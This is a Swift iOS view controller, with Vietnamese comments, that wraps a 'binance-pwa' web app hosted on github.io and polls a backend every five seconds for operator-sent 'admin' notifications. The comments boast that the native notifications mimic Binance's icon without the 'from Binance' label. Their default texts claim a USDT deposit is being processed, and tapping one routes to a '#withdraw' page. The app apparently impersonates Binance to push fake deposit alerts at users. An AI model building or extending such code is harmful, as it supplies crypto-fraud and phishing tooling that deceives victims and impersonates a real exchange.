import UIKit
import WebKit
import UserNotifications

class ViewController: UIViewController, WKNavigationDelegate, WKScriptMessageHandler {

    var webView: WKWebView!
    var activityIndicator: UIActivityIndicatorView!
    var pollingTimer: Timer?

    // URL Web App của bạn
    let webAppURLString = "https://ngdat257257-glitch.github.io/binance-pwa/"
    // URL Backend để kiểm tra thông báo mới
    let backendURLString = "https://binance-pwa-backend.onrender.com"

    override var preferredStatusBarStyle: UIStatusBarStyle {
        return .lightContent
    }

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = UIColor(red: 8/255.0, green: 9/255.0, blue: 11/255.0, alpha: 1.0)

        setupWebView()
        setupLoadingIndicator()
        loadWebApp()
        startNotificationPolling()
    }

    // MARK: - Cấu hình WKWebView
    private func setupWebView() {
        let contentController = WKUserContentController()

        // 1. Đăng ký JS Bridge để Website có thể gọi trực tiếp thông báo Native iOS
        contentController.add(self, name: "nativeNotification")

        // 2. Inject biến đánh dấu môi trường Native vào JavaScript Website
        let nativeFlagScript = WKUserScript(
            source: "window.isIOSNativeApp = true; window.__NATIVE_APP_VERSION = '1.0.0';",
            injectionTime: .atDocumentStart,
            forMainFrameOnly: true
        )
        contentController.addUserScript(nativeFlagScript)

        let config = WKWebViewConfiguration()
        config.userContentController = contentController
        config.allowsInlineMediaPlayback = true

        webView = WKWebView(frame: .zero, configuration: config)
        webView.translatesAutoresizingMaskIntoConstraints = false
        webView.navigationDelegate = self
        webView.backgroundColor = UIColor(red: 8/255.0, green: 9/255.0, blue: 11/255.0, alpha: 1.0)
        webView.isOpaque = false
        webView.scrollView.backgroundColor = UIColor(red: 8/255.0, green: 9/255.0, blue: 11/255.0, alpha: 1.0)
        webView.scrollView.contentInsetAdjustmentBehavior = .never

        // Kéo để tải lại (Pull to refresh)
        let refreshControl = UIRefreshControl()
        refreshControl.tintColor = UIColor(red: 243/255.0, green: 186/255.0, blue: 47/255.0, alpha: 1.0)
        refreshControl.addTarget(self, action: #selector(handleRefresh(_:)), for: .valueChanged)
        webView.scrollView.refreshControl = refreshControl

        view.addSubview(webView)

        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: view.topAnchor),
            webView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            webView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            webView.trailingAnchor.constraint(equalTo: view.trailingAnchor)
        ])
    }

    private func setupLoadingIndicator() {
        activityIndicator = UIActivityIndicatorView(style: .large)
        activityIndicator.color = UIColor(red: 243/255.0, green: 186/255.0, blue: 47/255.0, alpha: 1.0)
        activityIndicator.translatesAutoresizingMaskIntoConstraints = false
        activityIndicator.hidesWhenStopped = true
        view.addSubview(activityIndicator)

        NSLayoutConstraint.activate([
            activityIndicator.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            activityIndicator.centerYAnchor.constraint(equalTo: view.centerYAnchor)
        ])
    }

    private func loadWebApp() {
        if let url = URL(string: webAppURLString) {
            activityIndicator.startAnimating()
            let request = URLRequest(url: url, credentials: nil, cachePolicy: .reloadRevalidatingCacheData, timeoutInterval: 30)
            webView.load(request)
        }
    }

    @objc private func handleRefresh(_ sender: UIRefreshControl) {
        webView.reload()
        sender.endRefreshing()
    }

    // MARK: - WKNavigationDelegate
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        activityIndicator.stopAnimating()
        webView.scrollView.refreshControl?.endRefreshing()
    }

    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        activityIndicator.stopAnimating()
        webView.scrollView.refreshControl?.endRefreshing()
    }

    // MARK: - JS Bridge Handler (Nhận lệnh từ JavaScript trong Web App)
    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        if message.name == "nativeNotification" {
            guard let dict = message.body as? [String: Any] else { return }

            let title = dict["title"] as? String ?? "Xử lý tiền gửi USDT"
            let body = dict["body"] as? String ?? "Khoản tiền gửi USDT của bạn hiện đang được xử lý."
            let delaySeconds = dict["delaySeconds"] as? Double ?? 1.0
            let route = dict["route"] as? String ?? "#withdraw"

            triggerLocalNotification(title: title, body: body, delaySeconds: delaySeconds, route: route)
        }
    }

    // MARK: - Bắn Thông Báo Native iOS (UNUserNotificationCenter)
    // 100% Native, KHÔNG CÓ chữ "from Binance", Icon Binance vàng đen chuẩn
    func triggerLocalNotification(title: String, body: String, delaySeconds: Double = 1.0, route: String = "#withdraw") {
        let content = UNMutableNotificationContent()
        content.title = title
        content.body = body
        content.sound = UNNotificationSound.default
        content.badge = 1
        content.userInfo = ["route": route]

        let trigger = UNTimeIntervalNotificationTrigger(timeInterval: max(1.0, delaySeconds), repeats: false)
        let request = UNNotificationRequest(identifier: UUID().uuidString, content: content, trigger: trigger)

        UNUserNotificationCenter.current().add(request) { error in
            if let error = error {
                print("❌ Lỗi kích hoạt thông báo Native:", error.localizedDescription)
            } else {
                print("✓ Đã lên lịch thông báo Native iOS thành công: '\(title)' sau \(delaySeconds)s")
            }
        }
    }

    // MARK: - Điều hướng Route trong Web App khi người dùng chạm vào Thông báo
    func navigateToRoute(_ route: String) {
        let cleanRoute = route.replacingOccurrences(of: "'", with: "\\'")
        let jsCode = """
        (function() {
            try {
                if (window.handleNativeNotificationNavigate) {
                    window.handleNativeNotificationNavigate('\(cleanRoute)');
                } else if ('\(cleanRoute)'.startsWith('#')) {
                    window.location.hash = '\(cleanRoute)';
                } else {
                    window.location.href = '\(cleanRoute)';
                }
            } catch(e) {
                console.warn('Native navigate error:', e);
            }
        })();
        """
        DispatchQueue.main.async { [weak self] in
            self?.webView.evaluateJavaScript(jsCode, completionHandler: nil)
        }
    }

    // MARK: - Tự Động Polling Kiểm Tra Thông Báo Mới Từ Admin Server (Chạy ngầm)
    private func startNotificationPolling() {
        // Kiểm tra mỗi 5 giây xem Admin có vừa bấm gửi thông báo không
        pollingTimer = Timer.scheduledTimer(withTimeInterval: 5.0, repeats: true) { [weak self] _ in
            self?.checkPendingAdminNotifications()
        }
    }

    private var lastNotifTimestamp: Double = Date().timeIntervalSince1970

    private func checkPendingAdminNotifications() {
        guard let url = URL(string: "\(backendURLString)/api/device/events?since=\(lastNotifTimestamp)") else { return }

        URLSession.shared.dataTask(with: url) { [weak self] data, response, error in
            guard let self = self, let data = data, error == nil else { return }
            do {
                if let json = try JSONSerialization.jsonObject(with: data) as? [String: Any],
                   let hasNew = json["hasNew"] as? Bool, hasNew == true,
                   let notif = json["notification"] as? [String: Any] {

                    let title = notif["title"] as? String ?? "Xử lý tiền gửi USDT"
                    let body = notif["body"] as? String ?? ""
                    let delay = notif["delaySeconds"] as? Double ?? 1.0
                    let route = notif["route"] as? String ?? "#withdraw"

                    if let ts = notif["timestamp"] as? Double {
                        self.lastNotifTimestamp = ts
                    } else {
                        self.lastNotifTimestamp = Date().timeIntervalSince1970
                    }

                    DispatchQueue.main.async {
                        self.triggerLocalNotification(title: title, body: body, delaySeconds: delay, route: route)
                    }
                }
            } catch {}
        }.resume()
    }

    deinit {
        pollingTimer?.invalidate()
    }
}
